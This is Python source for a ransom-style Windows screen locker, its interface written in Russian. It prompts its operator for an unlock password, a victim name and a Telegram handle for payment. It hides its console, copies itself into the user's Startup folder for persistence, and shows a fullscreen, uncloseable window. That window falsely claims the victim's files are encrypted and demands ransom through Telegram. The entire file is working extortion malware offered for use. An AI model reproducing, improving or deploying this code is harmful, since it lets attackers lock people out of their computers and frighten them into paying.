print(r"""
    .o88o.                               o8o                .
    888 `"                               `"'              .o8
   o888oo   .oooo.o  .ooooo.   .ooooo.  oooo   .ooooo.  .o888oo oooo    ooo
    888    d88(  "8 d88' `88b d88' `"Y8 `888  d88' `88b   888    `88.  .8'
    888    `"Y88b.  888   888 888        888  888ooo888   888     `88..8'
    888    o.  )88b 888   888 888   .o8  888  888    .o   888 .    `888'
   o888o   8""888P' `Y8bod8P' `Y8bod8P' o888o `Y8bod8P'   "888"      d8'
        """)
print(r"""





""")
parol = input("введите пароль от винлокера: ")
name = input("введите от кого будет винлокер: ")
otkup = input("введите куда написать для откупа: ")

import tkinter as tk
import os
from tkinter import messagebox
import shutil
import sys
import ctypes

def add_to_startup_folder():
    script_path = os.path.abspath(sys.argv[0])
    
    startup_folder = os.path.join(
        os.environ["APPDATA"],
        "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
    )
    
    try:
        shutil.copy2(script_path, startup_folder)
    except Exception as e:
         print("ошибка автозагрузки!")

ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def check_input(event=None):
    user_input = entry1.get().strip() 
    if user_input == f"{parol}":  
        messagebox.showinfo("Доступ разблокирован!", "Вы разблокировали доступ к системе! Нажмите ОК для закрытия блокировщика.\nПользуйтесь : )")
        root.destroy() 
    else:
         messagebox.showinfo("упс!", "неверный пароль!")

root = tk.Tk()
root.title("black hat winlocker")
root.attributes("-fullscreen", True)
root.configure(bg="blue")
root.attributes("-topmost", True)
root.protocol("WM_DELETE_WINDOW", lambda: None)

entry1 = tk.Entry(root, show="*", width=30, font=("Arial", 25))

entry1.bind("<Return>", check_input)


button1 = tk.Button(root, text="подтвердить", command=check_input)

label4 = tk.Label(
    root,
    text="""
    упс! вы подверглись хакерской атаке и ваши файлы были зашифрованы!
    пока ваш компьютер находится в этом состоянии вы ничего не сможете сделать.
    Любая попытка обхода вируса карается повторным запуском вируса!""",
    foreground="white",        
    background="blue",  
    font=("Arial", 30),
    padx=10,
    pady=10
)

label5 = tk.Label(
    root,
    text=f"""
    для откупа вы можете связатся с нами
    писать нужно в социальную сеть telegram
    юзернейм автора @{otkup}""",
    foreground="white",        
    background="blue",  
    font=("Arial", 30),
    padx=10,
    pady=10
)

smert2 = tk.Label(root, text="""
error: ox0374582
error: 0x34769432
error: 0x017238
error: 0x675825637
error: 0x63836426
Ecryptor started!""", foreground="white", background="blue", font=("Arial", 20))

smert1 = tk.Label(root, text="""
              a          a
             aaa        aaa
            aaaaaaaaaaaaaaaa
           aaaaaaaaaaaaaaaaaa
          aaaaafaaaaaaafaaaaaa
          aaaaaaaaaaaaaaaaaaaa
           aaaaaaaaaaaaaaaaaa
            aaaaaaa  aaaaaaa
             aaaaaaaaaaaaaa
  a         aaaaaaaaaaaaaaaa
 aaa       aaaaaaaaaaaaaaaaaa
 aaa      aaaaaaaaaaaaaaaaaaaa
 aaa     aaaaaaaaaaaaaaaaaaaaaa
 aaa    aaaaaaaaaaaaaaaaaaaaaaaa
  aaa   aaaaaaaaaaaaaaaaaaaaaaaa
  aaa   aaaaaaaaaaaaaaaaaaaaaaaa
  aaa    aaaaaaaaaaaaaaaaaaaaaa
   aaa    aaaaaaaaaaaaaaaaaaaa
    aaaaaaaaaaaaaaaaaaaaaaaaaa
     aaaaaaaaaaaaaaaaaaaaaaaaa
""", foreground="white", background="blue", font=("Arial", 20))

label1 = tk.Label(root, text=f"ваш виндовс заблокирован {name}", foreground="white", background="blue", font=("Arial", 35))

def show_smert1():
    smert2.place(x=0, y=0)
    root.after(2000, hide_smert1)

def hide_smert1():
    smert2.place_forget()
    show_smert2()

def show_smert2():
    smert1.place(x=0, y=0)
    root.after(2000, hide_smert2)

def hide_smert2():
    smert1.place_forget()
    show_label1()

def show_label1():
    label1.pack()
    entry1.pack()
    button1.pack()
    label4.pack()
    label5.pack()

if __name__ == "__main__":
    add_to_startup_folder()
    show_smert1()
    root.mainloop()